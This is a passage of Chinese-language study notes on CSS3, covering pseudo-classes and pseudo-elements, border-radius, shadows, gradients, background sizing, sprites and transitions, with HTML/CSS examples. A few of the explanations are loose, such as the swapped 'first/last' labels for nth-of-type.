<body>
<p style="">添加样式效果</p>
<ol>
    <li class="first">前端与移动开发</li>
    <span>能不能变成蓝色</span>
    <li>java</li>
    <li>javascript</li>
    <li>c++</li>
    <li>平面设计</li>
</ol>
</body>
```
>[success] # 伪类选择器
```
1.E:first-child --- 查找E这个元素的父元素的第一个子元素E，被修饰的元素必须是，父元素的第一个子元素，且标签为指定的标签E
2.E:last-child --- 最后一个子元素,同上
3.E:first-of-type --- 和上面的不同无论被修饰的标签是否是第一个父元素的子元素，只找到符合第一个元素，且标签为指定的标签E
4.E:last-of-type --- 最后一个子元素,同上
5.E:nth-child(n) --- 第n个子元素，从一开始里面写5就是第四个标签
6.E:nth-last-child(n) --- 同E:nth-child(n) 相似，只是倒着计算
7.E:nth-child(even) --- 所有的偶数
8.E:nth-child(odd) --- 所有的奇数
9.E:empty --- 空值:没有任何的内容，连空格都没有
10.E:nth-last-of-type(-n+5) --- 为前五加样式
11.E:nth-of-type(-n+5) --- 后五个加样式
```
>[danger] ##### 案例

![](https://box.kancloud.cn/e6d995c1fc8f799f07723ba4961b25cf_335x365.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        ul{
            width: 300px;
            height: 300px;
            margin:0 auto;
            margin-top:100px;
            list-style: none;
            border-left:1px solid #ccc;
            border-top:1px solid #ccc;
        }
        ul > li{
            float: left;
            width:100px;
            box-sizing: border-box;
            height: 100px;
            line-height:100px;
            text-align: center;
            background-color: #fff;
            border-right:1px solid #ccc;
            border-bottom:1px solid #ccc;
        }
        /*下面这句样式查找：li的父元素中的第一个li元素
        1.相对于当前指定元素的父元素
        2.查找的类型必须是指定的类型*/
        li:first-child{
            color: red;
        }
        /*E:last-child:查找E元素的父元素中最后一个指定类型的子元素*/
        li:last-child{
            background-color: skyblue;
        }

        /*查找的时候限制类型  first-of-type*/
        /*1.也是相对于父元素
        2.在查找的时候只会查找满足类型条件的元素，过渡掉其它类型的元素*/
        li:first-of-type{
            color: red;
        }
        li:last-of-type{
            color: orange;
        }

        li:nth-child(5){
            color: fuchsia;
        }
        /*偶数个元素添加背景  even:偶数  odd:奇数*/
        li:nth-of-type(even){
            background-color: orange;
        }
        li:nth-of-type(odd){
            background-color: pink;
        }
        /*前3个加样式*/
        li:nth-last-of-type(-n+3){
            font-size: 30px;
        }
        /*后3个加样式*/
        li:nth-of-type(-n+3){
            font-size: 40px;
        }

        /*空值:没有任何的内容，连空格都没有*/
        li:empty{
            background-color: red;
        }
    </style>
</head>
<body>
<ul>
    <div></div>
    <li>1</li>
    <li>2</li>
    <li>3</li>
    <li>4</li>
    <li>5</li>
    <li>6</li>
    <li>7</li>
    <li>8</li>
    <li>9</li>
</ul>
</body>
</html>
```
>[success] # 创建伪类元素before、after
```
1.E::before、E::after是一个行内元素，需要转换成块:display:block   float:**  position:
2.必须添加content,哪怕不设置内容，也需要content:””
3.E:after、E:before 在旧版本里是伪类，在新版本里是伪元素，新版本下E:after、E:before会被自动识别为E::after、E::before，按伪元素来对待，这样做的目的是用来做兼容处理
4.E::before: 定义在一个元素的内容之前插入content属性定义的内容与样式
5.E::after: 定义在一个元素的内容之后插入content属性定义的内容与样式
6.注意：
7.IE6、IE7与IE8（怪异模式Quirks mode）不支持此伪元素
8.CSS2中 E:before或者E:after，是属于伪类的，并且没有伪元素的概念，CSS3中 提出伪元素的概念 E::before和E::after，并且归属到了伪元素当中，伪类里就不再存在E:before或者   E:after伪类
```
>[danger] ##### 案例代码
![](https://box.kancloud.cn/d65eac710098c5cfefddce425d8a259e_449x210.png)
```
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        body{
            padding: 200px;
        }
        div:nth-of-type(1){
            width: 300px;
            height: 200px;
            background-color: red;
            float: left;
        }
        div:nth-of-type(2){
            width: 100px;
            height: 200px;
            background-color: blue;
            float: left;
            position: relative;
        }

        div:nth-of-type(2)::before{
            /*必须添加content属性，否则后期不可见*/
            content: "";
            /*默认是行级元素，如果想设置宽高，就必须转换为块级元素*/
            position: absolute;
            width: 20px;
            height: 20px;
            background-color: #fff;
            border-radius: 10px;
            left: -10px;
            top: -10px;
        }
        div:nth-of-type(2)::after{
            /*必须添加content属性，否则后期不可见*/
            content: "";
            /*默认是行级元素，如果想设置宽高，就必须转换为块级元素*/
            position: absolute;
            width: 20px;
            height: 20px;
            background-color: #fff;
            border-radius: 10px;
            left: -10px;
            bottom: -10px;
        }
    </style>
</head>
<body>
<div></div>
<div></div>
```
[盒子模型](盒子.md)
[盒子圆角](盒子圆角.md)
[盒子阴影](盒子阴影.md)
[盒子颜色的渐变](盒子颜色的渐变.md)

[TOC]
>[success] # html5 的盒子模型
```
1.在默认情况下，CSS设置的盒子宽度仅仅是内容区的宽度，而非盒子的宽度。同样，高度类似。真正盒子的宽度（在页面
呈现出来的宽度）和高度，需要加上一些其它的属性。例如：
padding + border + width = 盒子的宽度
padding + border + height = 盒子的高度
2.设置了box-sizing 最好使用padding
```
>[danger] ##### 利用html5 --box-sizing
```
1.content-box:对象的实际宽度等于设置的width值和border、padding之和（默认的css2样式）
2.border-box： 对象的实际宽度就等于设置的width值，即使定义有border和padding也不会改变对象的实际宽度
```
![](https://box.kancloud.cn/4c4d90ea3ad3e828d8fa9a71060f7d63_1046x234.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .items{
            width: 100%;
            text-align: center;
            margin-top: 100px;
        }
        .item{
            width: 316px;
            height: 170px;
            display: inline-block;
            margin: 0 10px;
            overflow: hidden;
            box-sizing: border-box;
        }
        .item:hover{
            border: 10px solid red;
        }

        .b1{
            background-image: url("../images/1.jpg");
        }
        .b2{
            background-image: url("../images/2.jpg");
        }
        .b3{
            background-image: url("../images/3.jpg");
        }
    </style>
</head>
<body>

    <div class="items">
        <div class="item b1"></div>
        <div class="item b2"></div>
        <div class="item b3"></div>
    </div>

</body>
</html>
```
>[success] # 圆角
```
1.border-radius可以通过值来定义样式相同的角，也对每个角分别定义
```
>[success] # 画圆形效果
![](https://box.kancloud.cn/856942d6418375a55e1c2c36b504e6bf_258x262.png)
```
1.如图如果要画一个整圆，半径等于div宽度的一半，如果话圆角圆角设置半径起始点在div四个角开始的
2.border-radius：*px: 将创建四个大小一样的圆角
3.border-radius:*px *px *px *px: 四个值分别表示左上角、右上角、右下角、左下角
4.border-radius:*px *px：第一个值表示左上角、右下角；第二个值表示右上角、左下角
5.border-radius:*px *px *px：第一个值表示左上角；第二个值表示右上角、左下角；第三个值表示右下角
```
>[danger] ##### 案例代码
```
<style>
    *{
        padding: 0;
        margin: 0;
    }
    div{
        width: 200px;
        height: 100px;
        background-color: red;
        margin: 100px auto;
        /*添加边框圆角*/
        /*1.设置一个值：四个角的圆角值都一样*/
        /*border-radius: 10px;*/
        /*2.设置两个值:第一个值控制左上/右下，第二个值控制右上/左下*/
        /*border-radius: 10px 30px;*/
        /*3.设置三个值：第一个值控制左上，第二值控制右上/左下，第三个值控制右下*/
        /*border-radius: 10px 40px 60px;*/
        /*4.设置四个值：左上  右上 右下 左下*/
        /*border-radius: 10px 30px 60px 100px;*/
    }
</style>
</head>
<body>

    <div>`</div>

</body>
```
>[danger] ##### 画椭圆
![](https://box.kancloud.cn/1e90f24b2f7e2c4ac097170f6e65398d_423x240.png)
```
1.椭圆的构成需要两个值来设置 / 用着符号进行分割设置
```
>[danger] ##### 代码
```
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        div{
            width: 200px;
            height: 100px;
            background-color: red;
            margin: 100px auto;
            /*添加/是用来设置当前个不同方向的半径值  水平x方向/垂直y方向*/
            border-radius: 100px/50px;
        }
    </style>
</head>
<body>

    <div>`</div>

</body>
```

>[success] # 单独设置某一个角
```
1./*border-上下-左右-radius:*/ --- 用法的公式
2.border-top-left-radius --- 上左
3.border-top-right-radius --- 上右
4.border-bottom-right-radius --- 下右
5.border-bottom-left-radius --- 下左
```
>[danger] ##### 代码
```
<style>
*{
    padding: 0;
    margin: 0;
}
div{
    width: 200px;
    height: 100px;
    background-color: red;
    margin: 100px auto;
    /*border-上下-左右-radius:*/
    border-top-right-radius: 100px;
    border-top-left-radius: 100px;
    border-bottom-left-radius: 100px;
    border-bottom-right-radius: 100px;
}
</style>
</head>
<body>

    <div>`</div>

</body>
```
>[success] # 椭圆单个角设置弧度
```
1.椭圆需要设置两个坐标所以在一个角设置水平和垂直
2.border-top-right-radius: 100px 50px;
3.border-bottom-left-radius: 80px 40px;
4.border-bottom-right-radius: 60px 30px;
5.border-top-left-radius: 40px 20px;
```
>[danger] ##### 代码
```
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        div{
            width: 200px;
            height: 100px;
            background-color: red;
            margin: 100px auto;
            /*设置某个角点的两个方向上的不同圆角*/
            border-top-right-radius: 100px 50px;
            border-bottom-left-radius: 80px 40px;
            border-bottom-right-radius: 60px 30px;
            border-top-left-radius: 40px 20px;
            /*如果想设置四个角点的不同方向上的不同圆角值*/
            /*分别是水平方向的：左上，右上，右下，左下 / 垂直方向的：左上，右上，右下，左下*/
            border-radius: 100px 0px 0px 0px/20px 0px 0px 0px;
        }
    </style>
</head>
<body>

    <div>`</div>

</body>
</html>
```
>[success] # 综合案例 安卓机器人
![](https://box.kancloud.cn/bed1ea32fc325ad127629b4482d53ec7_529x512.png)
```
  <style>
        *{
            padding: 0;
            margin: 0;
        }
        body{
            background-color: #ccc;
        }
        .content{
            height: 500px;
            width:500px;
            border:1px solid red;
            margin: 50px auto;
        }
        .content>.an_header{
            width: 250px;
            height: 125px;
            background-color: darkgreen;
            margin: 10px auto;
            /*画半圆注意问题 宽高比例2:1*/
            border-radius: 125px 125px 0 0;
            position: relative;
        }
        .an_header::before,
        .an_header::after{
            /*1.一定设置content属性*/
            content: "";
            /*2.如果需要设置宽度就应该转换其为块级元素，它默认是行级元素  float  display  position*/
            position: absolute;
            bottom: 40px;
            width: 20px;
            height: 20px;
            border-radius: 10px;
            background-color: #fff;
        }

        .an_header::before{
            left: 70px;
        }
        .an_header::after{
            right: 70px;
        }
        .an_body{
            width: 250px;
            height: 250px;
            background-color: darkgreen;
            border-radius: 0px 0px 20px 20px;
            margin:0 auto;
            position: relative;
        }
        .an_body::before,
        .an_body::after{
            content: "";
            position: absolute;
            top: 20px;
            background-color: darkgreen;
            width: 30px;
            height: 180px;
            border-radius: 10px;
        }
        .an_body::before{
            left:-40px;
        }
        .an_body::after{
            right:-40px;
        }
        .an_footer{
            width: 250px;
            height: 100px;
            position: relative;
            margin:0 auto;

        }
        .an_footer::before,
        .an_footer::after{
            content: "";
            position: absolute;
            top: 00px;
            background-color: darkgreen;
            width: 30px;
            height: 90px;
            border-radius: 0px 0px 10px 10px;
        }
        .an_footer::before{
            left: 50px;
        }
        .an_footer::after{
            right: 50px;
        }
    </style>
</head>
<body>

<div class="content">
    <div class="an_header"></div>
    <div class="an_body"></div>
    <div class="an_footer"></div>
</div>
```
>[success] # 盒子模糊阴影效果
```
1.box-shadow 属性向边框添加一个或多个阴影。
2.语法：box-shadow: h-shadow v-shadow blur spread color inset;
注释：box-shadow 向框添加一个或多个阴影。该属性是由逗号分隔的阴影列表，每个阴影由 2-4 个长度值、可选的颜色值以及可选的 inset 关键词来规定。省略长度的值是 0
```
|值	|描述|
| --- | --- |
|h-shadow|	必需。水平阴影的位置。允许负值。
|v-shadow	|必需。垂直阴影的位置。允许负值。
|blur	|可选。模糊距离。
|spread	|可选。阴影的尺寸。值越大，阴影的扩散面积越大
|color|	可选。阴影的颜色。
|inset	|可选。将外部阴影 (outset) 改为内部阴影。

>[danger] ##### 代码
![](https://box.kancloud.cn/9b288d3d8b396f77bca9bb58e2f0593a_291x238.png)
```
<style>
div{
    width: 200px;
    height:200px;
    background-color: orange;
    margin: 100px auto;
    box-shadow: 10px 10px 10px,10px 10px rgba(0,0,150,0.2) inset;
}
</style>
</head>
<body>

<div></div>
```
>[danger] ##### 相册案例
![](https://box.kancloud.cn/347a7c444c0fee5fa4f201a709c0f179_1011x628.png)
```
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        body {
            margin: 0;
            padding: 0;
            background-color: #F7F7F7;
        }

        img {
            width: 100%;
            display: block;
        }

        .items {
            padding: 30px;
            overflow: hidden;
        }
        .item {
            width: 200px;
            height: 200px;
            padding-bottom: 100px;
            margin-right: 30px;
            border: 1px solid #CCC;
            background-color: #FFF;
            float: left;
        }
        /*需求：为前面四个图片盒子添加右下角的外阴影，为最后个盒子添加四个方向的内阴影*/
        .item:nth-of-type(-n+4){
            box-shadow: 3px 3px 3px #ccc;
        }
        .item:last-of-type{
            box-shadow: 3px 3px 3px #ccc inset,-3px -3px 3px #ccc inset;
        }
    </style>
</head>
<body>

<div class="items">
    <div class="item">
        <img src="../images/pic_1.jpg">
    </div>
    <div class="item">
        <img src="../images/pic_2.jpg">
    </div>
    <div class="item">
        <img src="../images/pic_3.jpg">
    </div>
    <div class="item">
        <img src="../images/pic_4.jpg">
    </div>
    <div class="item"></div>
</div></body>
```
>[success] # 盒子颜色依次渐变linear-gradient
```
1.linear-gradient(方向，开始颜色，颜色2 ，颜色3...); background的属性
2.方向：to top:0degto /right:90degto/ bottom:180deg --默认值  / to left:270deg
3.可以填数字方向 ，也可以英文方向
4.background: linear-gradient(to right,red 0%,red 50%,blue 50%,blue 100%);
```
>[danger] ##### 案例
![](https://box.kancloud.cn/2da2fe2bd152c975da74417ea9aa41db_301x304.png)
```
<style>
    div{
        width: 300px;
        height: 300px;
        /*background: linear-gradient(to right,red,yellow);*/
        background: linear-gradient(90deg,red,yellow);
    }
</style>
</head>
<body>
<div></div>
```
>[success] # 圆形渐变
```
1.background: radial-gradient(red,blue);
2.语法：radial-gradient(形状 大小 坐标,颜色1，颜色2...)：
3.形状shape:circle:产生圆形的渐变色   ellipse:默认适配当前的形状,如果是正方形的容器，两者效果一样.如果宽高不一样，默认效果切换到ellipse
4.at position:坐标，默认在正中心。可以赋值坐标（参照元素的左上角），也可以赋值关键字(left center right top bottom)
5.大小size: closest-side：最近边； farthest-side：最远边； closest-corner：最近角； farthest-corner：最远角。默认是最远的角farthest-corner     
```
>[danger] ##### 案例
![](https://box.kancloud.cn/82928879e11389d056a02f8cbb4c6ed3_158x503.png)
```
    <style>
        .a{
            width: 300px;
            height: 200px;
            background: radial-gradient(red,blue);
        }
        .b{
            width: 300px;
            height: 200px;
            /*默认是ellipse自适应的图案*/
            background: radial-gradient(circle,red,blue);
        }
        .c{
            width: 300px;
            height: 200px;
            /*设置从定义圆心开始画圆 */
            background: radial-gradient(circle farthest-side at 50px 50px,red,blue)
        }
        .d{
            width: 300px;
            height: 200px;
            /*通过名字定义设置 */
            background: radial-gradient(at left top,red,blue);
        }
        .e{
            width: 300px;
            height: 200px;
            /*设置颜色的位置*/
            background: radial-gradient(red,red 50%,blue 50%,blue);        }
    </style>
</head>
<body>
<div class="a"></div>
<div class="b"></div>
<div class="c"></div>
<div class="d"></div>
<div class="e"></div>
```

>[danger] ##### 案例
![](https://box.kancloud.cn/42aa8b487d2bb868d0c665eed3867422_180x560.png)
```
    <style>
        body{
            background-color: #ccc;
        }
        div:first-of-type{
            width: 300px;
            height: 300px;
            /*background: radial-gradient(
                    #fff 0%,#fff 10%,
                    #000 10%,#000 20%,
                    #fff 20%,#fff 30%,
                    #000 30%,#000 40%);*/
			// 默认从圆心开始      at center center               
            background: repeating-radial-gradient(circle closest-side at center center,
            #fff 0%,#fff 10%,
            #000 10%,#000 20%);
        }
        div:last-of-type{
            width: 200px;
            height: 800px;
            background: repeating-linear-gradient(45deg,
                    #fff 0%,#fff 10%,
                    #000 10%,#000 20%);
        }
    </style>
</head>
<body>
<div></div>
<div></div>
```
>[success] # 伪元素首字母下沉
```
1.E::first-letter文本的第一个字母或字(不是词组)
2.E::first-line 文本第一行
3.E::selection 可改变选中文本的样式
```
>[danger] ##### 案例
![](https://box.kancloud.cn/05e7eeab028eeb81b5d50ad57d785796_401x65.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        /*获取第一个字符：实现首字下沉*/
        p:first-letter{
            color:red;
            font-size: 30px;
            float: left;/*文本环绕*/
        }

        /*获取第一行内容:如果设置了::first-letter,那么无法同时设置它的样式*/
        p:first-line{
            text-decoration: underline;
        }

        /*设置当前选中内容的样式*/
        /*它只能设置显示的样式，而不能设置内容大小*/
        p::selection{
            background-color: pink;
            color: red;
        }
    </style>
</head>
<body>
<p>眉毛上的汗水和眉毛下的泪水，你必须选择一样<br>你不努力，活该生活在社会的最底层</p>

</body>
</html>
```
>[success] # 颜色透明度

>[danger] ##### rgba
```
R：红色值。正整数 | 百分数
G：绿色值。正整数 | 百分数
B：蓝色值。正整数| 百分数
A：透明度。取值0~1之间
```
```
div{
    width: 200px;
    height: 200px;
    background-color: rgba(10,20,245,0.5);
    color: white;
}
```
>[danger] ##### HSLA(H,S,L,A)
```
H：Hue(色调,色相)。0(或360)表示红色，120表示绿色，240表示蓝色，也可取其他数值来指定颜色。取值为：0 – 360,过渡为：(红橙黄绿青蓝紫红)
S：Saturation(饱和度)。取值为：0.0% - 100.0%
L：Lightness(亮度)。取值为：0.0% - 100.0%，50%是平衡	A：Alpha透明度。取值0~1之间。
```
```
span{
    width: 200px;
    height: 200px;
    display: block;
    background-color: hsla(360,100%,50%,0.6);
    color
}
```
>[danger] ##### 透明度
```
a)	opacity只能针对整个盒子设置透明度，子盒子及内容会继承父盒子的透明度
b)	transparent 不可调节透明度，始终完全透明
c)	使用rgba 来控制颜色，相对opacity ，不具有继承性
```
>[success] # 文本阴影
![](https://box.kancloud.cn/25b7d1115fcbdb32a13b1748969f9aec_285x307.png)
```
text-shadow:[颜色(Color)  x轴(X Offset) y轴(Y Offset) 模糊半径(Blur)],[颜色(color) x轴(X Offset) y轴(Y Offset) 模糊半径(Blur)]...
或者
text-shadow:[x轴(X Offset) y轴(Y Offset)  模糊半径(Blur)  颜色(Color)],[x轴(X Offset) y轴(Y Offset)  模糊半径(Blur)  颜色(Color)]...
```
>[danger] ##### 效果
![](https://box.kancloud.cn/ba88d28c203e0dc0465b9c1697db625a_217x368.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .demo{
            width: 600px;
            padding: 30px;
            background-color: #666;
            margin:20px auto;
            text-align: center;
            font:bold 80px/100% "微软雅黑";
            color: #fff;
        }
        /*添加阴影 text-shadow:offsetX offsetY blur color*/
        .demo1{
            text-shadow: -2px -2px 5px red;
        }
        .demo2{
            text-shadow: 0px 0px 30px #fff;
        }
        /*多层阴影效果*/
        .demo3{
            text-shadow: 0px 0px 30px #fff,0px 0px 50px red,0px 0px 70px #fff;
        }
        .demo4{
            color: black;
            text-shadow: 0px 1px 0px #fff;
        }
        /*浮雕立体效果*/
        .demo5{
            color: #fff;
            text-shadow: -1px -1px 0px #eee,-2px -2px 0px #ddd,-3px -3px 0px #ccc;
        }
        .demo6{
            color: transparent;
            text-shadow: 0px 0px 8px hsla(30,100%,30%,1);
        }
    </style>
</head>
<body>
<div class="demo demo1">中华人民共和国</div>
<div class="demo demo2">中华人民共和国</div>
<div class="demo demo3">中华人民共和国</div>
<div class="demo demo4">中华人民共和国</div>
<div class="demo demo5">中华人民共和国</div>
<div class="demo demo6">中华人民共和国</div>
<div class="demo demo7">中华人民共和国</div>
</body>
</html>
```
>[success] # background 设置
```
1. 默认repeat 平铺效果图片大小进行平铺
2. 配合background-repeat 属性对应  
   round:会将图片进行缩放之后再平铺 / space:图片不会缩放平铺，只是会在图片之间产生相同的间距值
3.设置background-attachment浏览器窗口滚动的时候  效果
   fixed:背景图片的位置固定不变
   scroll:当滚动容器的时候，背景图片也会跟随滚动
4.设置background-attachment 装图片div滚动的效果
	local:背景图片会跟随内容一起滚动
    scroll:背景图片不会跟随内容一起滚动
```

>[danger] ##### 案例
```
<style>
    div{
        width: 500px;
        height: 500px;
        border: 1px solid red;
        overflow: scroll;
        /*1.添加背景颜色*/
        /*background-color: skyblue;*/
        /*2.添加背影图片
        如果图片大于容器，那么默认就从容器左上角开始放置
        如果图片小于容器，那么图片默认会平铺*/
        /*background-image: url("../images/bg-img.jpg");*/
        background-image: url("../images/share1.png");
        /*3.设置背景平铺
        round:会将图片进行缩放之后再平铺
        space:图片不会缩放平铺，只是会在图片之间产生相同的间距值*/
        /*background-repeat: space;*/
        /*4.设置在滚动容器的背景的行为：跟随滚动/固定
        fixed:背景图片的位置固定不变
        scroll:当滚动容器的时候，背景图片也会跟随滚动*/

        /*local和scroll的区别：前提是滚动当前容器的内容
        local:背景图片会跟随内容一起滚动
        scroll:背景图片不会跟随内容一起滚动*/
        background-attachment: fixed;
    }
</style>
</head>
<body>
<div>
    <p style="height: 800px;"></p>
</div>
<span style="height: 800px;display: block"></span>
</body>
```
>[success] # background-size 设置大小
```
1.background-size: auto(原始图片大小) || number(数值) || percentage(百分比) || cover(放大铺满) || contain(缩小铺满)
2.不设置默认从图片左上角显示，图片大于div显示效果是图片左上角内容
3.设置背景图片的大小  宽度/高度   宽度/auto(保持比例自动缩放)，建议：在使用这个属性之前衔确定宽高比与容器的宽高比  是否一致，否则会造成图片失真变形，例如
    background-size: 300px 500px
    background-size: 300px
4.设置百分比，是参照父容器可放置内容区域的百分比如果div 宽高 位300/400 设置background-size: 50% 50%;，图片对应宽高150/200
5.设置contain:按比例调整图片大小，使用图片宽高自适应整个元素的背景区域，使图片全部包含在容器内
    * 图片大于容器：有可能造成容器的空白区域,将图片缩小
    * 图片小于容器：有可能造成容器的空白区域，将图片放大
    * 留白由于自适应缘故，宽度或者高度符合div大小，单比例缩放无法保证，所以图片会造成留白
6.cover:与contain刚好相反，背景图片会按比例缩放自 适应整个背景区域，如果背景区域不足以包含所有背景图片，图片内容会溢出
    * 图片大于容器：等比例缩小，会填满整个背景区域，有可能造成图片的某些区域不可见
    * 图片小于容器：等比例放大，填满整个背景区域，图片有可能造成某个方向上内容的溢出
```
>[danger] ##### contain 效果案例
```
contain：其主要是将背景图片缩小，以适合铺满整个容器，这个主要运用在，当背景图片大于元素容器时，而又需要将背景图片全部显示出来，此时我们就可以使用contain将图片缩小到适合容器大小为止。
```
图片大于div 设置contain 后，将整个图片显示在div中，产生留白效果
![](https://box.kancloud.cn/3b13242115bba9533d7e8b6c1652c12f_160x250.png)
```
<style>
div{
    width: 300px;
    height: 500px;
    border: 1px solid red;
    /*添加背景*/
    background-image: url("../images/bg-img.jpg");
    /*background-image: url("../images/share1.png");*/
    background-repeat: no-repeat;
    background-size: contain;
}
</style>
</head>
<body>
<div></div>
```
>[danger] ##### cover 效果案例
```
cover：此值是将图片放大，以适合铺满整个容器，这个主要运用在，当图片小于容3器时，又无法使用background-repeat来
实现时，我们就可以采用cover;将背景图片放大到适合容器的大小d)cover：此值是将图片放大，以适合铺满整个容器，这个主
要运用在，当图片小于容3器时，又无法使用background-repeat来实现时，我们就可以采用cover;将背景图片放大到适合容
器的大小
```
将图片放大，以适合铺满整个容器，部分内容缺失造成
![](https://box.kancloud.cn/bfe1134adf3ace9761edfc95bb8d4bb9_181x269.png)
```
<style>
    div{
        width: 300px;
        height: 500px;
        border: 1px solid red;
        /*添加背景*/
        background-image: url("../images/bg-img.jpg");
        /*background-image: url("../images/share1.png");*/
        background-repeat: no-repeat;

        /*cover:与contain刚好相反，背景图片会按比例缩放自 适应整个背景区域，如果背景区域不足以包含所有背景图片，图片内容会溢出
        1.图片大于容器：等比例缩小，会填满整个背景区域，有可能造成图片的某些区域不可见
        2.图片小于容器：等比例放大，填满整个背景区域，图片有可能造成某个方向上内容的溢出*/
        background-size: cover;
    }
</style>
</head>
<body>
<div></div>
```
>[danger] ##### 实际网站案例
```
1.美工图片一般会大于实际，为了让图片在div 中显示配合cover 让图片在整个div中显示，让内容居中
```
```
   <style>
        *{
            padding: 0;
            margin: 0;
        }
        div{
            width: 100%;
            height: 360px;
            background: url("../images/slide_01_2000x410.jpg");
            /*设置背景图片的大小*/
            background-size: cover;
            /*设置position*/
            background-position: center;
        }
    </style>
</head>
<body>
<div>
    
</div>
```
>[success] # 精灵图
```
1.普通设置精灵图一般使用坐标调整，设置图片展示，div显示一般是图片左上角
2.利用background-origin 属性让图片在div 起始点在border /padding/content 起点显示
3.background-clip 属性规定背景的绘制区：虽然是设置裁切，但是控制的是显示。说白了，就是设置最终显示那些区域
4.语法：background-clip: border-box|padding-box|content-box;
```
>[danger] ##### 案例
![](https://box.kancloud.cn/acfa4eef953386335ea3391aa6c96c4a_130x212.png)
```
配合 background-clip: content-box; 只显示div 内容图片
```
```
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        /*提升移动端响应区域的大小*/
        a{
            width: 50px;
            height: 50px;
            display: block;
            background-color: #ddd;
            margin:100px auto;
            box-sizing: border-box;
            
            background-image: url("../images/sprites.png");
            /*设置背景偏移，参照background-origin原点，这个原点默认在容器的左上角*/
            background-position: -20px 0;

            /*添加padding*/
            padding:14px;
            /*设置背景坐标的原点
            border-box:从border的位置开始填充背景，会与border重叠
            padding-box:从padding的位置开始填充背景，会与padding重叠
            content-box:从内容的位置开始填充背景*/
            background-origin: content-box;
            /*设置内容的裁切:设置的是裁切，控制的是显示
            border-box:其实是显示border及以内的内容
            padding-box:其实是显示padding及以内的内容
            content-box:其实是显示content及以内的内容*/
            background-clip: content-box;
        }
    </style>
</head>
<body>
<a href=""></a>
```
>[success] # 动画效果
```
1.最简单的移动效果，点击div触发css active，改变div的postition
```
```
    <style>
        div{
            width: 200px;
            height: 200px;
            background-color: red;
            position: absolute;
            left: 100px;
            top: 100px;
        }
        div:active{
            left: 1000px;
        }
    </style>
</head>
<body>
<div></div>
```
>[success] # 使用 css3 -- transition
|值|	描述
|---|---|
|transition-property|	规定设置过渡效果的 CSS 属性的名称。|
|transition-duration|	规定完成过渡效果需要多少秒或毫秒。|
|transition-timing-function|	规定速度效果的速度曲线。|
|transition-delay	|定义过渡效果何时开始。|

* transition-timing-function 参数介绍

|值	|描述|
|---|---|
|linear|	规定以相同速度开始至结束的过渡效果（等于 cubic-bezier(0,0,1,1)）。|
|ease	|规定慢速开始，然后变快，然后慢速结束的过渡效果（cubic-bezier(0.25,0.1,0.25,1)）。|
|ease-in|	规定以慢速开始的过渡效果（等于 cubic-bezier(0.42,0,1,1)）。|
|ease-out|	规定以慢速结束的过渡效果（等于 cubic-bezier(0,0,0.58,1)）。|
|ease-in-out|	规定以慢速开始和结束的过渡效果（等于 cubic-bezier(0.42,0,0.58,1)）。|
|cubic-bezier(n,n,n,n)|	在 cubic-bezier 函数中定义自己的值。可能的值是 0 至 1 之间的数值。|

>[danger] ##### 案例
* 简单案例 使用
```
    <style>
        div{
            width: 200px;
            height: 200px;
            background-color: red;
            position: absolute;
            left: 100px;
            top: 100px;
            /*添加过渡效果:过渡效果执行完毕之后，默认会还原到原始状态*/
            /*1.transition-property:添加过渡效果的样式属性名称*/
            transition-property: left;
            /*2.transition-duration:过渡效果的耗时 以秒做为单位,起始位置到终点位置2s*/
            transition-duration: 2s;
            /*3.transition-timing-function:设置时间函数--控制运动的速度*/
            transition-timing-function: linear;
            /*4.transition-delay:过渡效果的延迟,两秒后执行执行动画*/
            transition-delay: 2s;
        }
        div:active{
            left: 1000px;
        }
    </style>
</head>
<body>
<div></div>
```
* 缩写使用
```
简写：transition:属性名称 过渡时间  时间函数  延迟
transition: left 2s linear 0s;
```
```
    <style>
        div{
            width: 200px;
            height: 200px;
            background-color: red;
            position: absolute;
            left: 100px;
            top: 100px;
            /*简写：transition:属性名称 过渡时间  时间函数  延迟*/
            transition: left 2s linear 0s;
        }
        div:active{
            left: 1000px;
        }
    </style>
</head>
<body>
<div></div>
```
* 改变多个属性动画
```
为多个样式同时添加过渡效果，监听了两个属性一个left 一个banckgroud-color
transition: left 2s linear 0s,background-color 5s linear 0s;
```
```
    <style>
        div{
            width: 200px;
            height: 200px;
            background-color: red;
            position: absolute;
            left: 100px;
            top: 100px;
            /*为多个样式同时添加过渡效果，监听了两个属性一个left 一个banckgroud-color*/
            transition: left 2s linear 0s,background-color 5s linear 0s;
        }
        div:active{
            /*对应的两个监听*/
            left: 1000px;
            background-color: blue;
        }
    </style>
</head>
<body>
<div></div>
```
* 控制所有和兼容代码
```
    <style>
        div{
            width: 200px;
            height: 200px;
            background-color: red;
            position: absolute;
            left: 100px;
            top: 100px;
            /*为所有样式添加过渡效果 all:所有样式
            1.所有样式的过渡效果一样
            2.效率低下，它会去查询所有添加的样式
            3.建议：以后不要这么写
            4.steps(4):可以让过渡效果分为指定的几次来完成*/
            transition:all 2s steps(4);
            -moz-transition: all 2s steps(4);
            -webkit-transition: all 2s steps(4);
            -o-transition: all 2s steps(4);
        }
        div:active{
            /*对应的两个监听*/
            left: 1000px;
            background-color: blue;
        }
    </style>
</head>
<body>
<div></div>
```
>[success] # 手风琴样式
![](https://box.kancloud.cn/b92d9b1883de7bd8767fd738027b5958_278x382.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .menu{
            width: 200px;
            /*高度自定义高度，不知道内容 会多高*/
            height:auto;
            margin:100px auto;
        }
        .item>.itemBox{
            width: 100%;
            height: auto;
        }
        .item>h3{
            height: 40px;
            line-height: 40px;
            background-color: #7dffe7;
            color: orange;
            border-bottom: 2px solid #ccc;
            padding-left:10px;
        }
        .item > .itemBox > ul{
            list-style: none;
            background-color: #eaffb6;
            padding:10px;
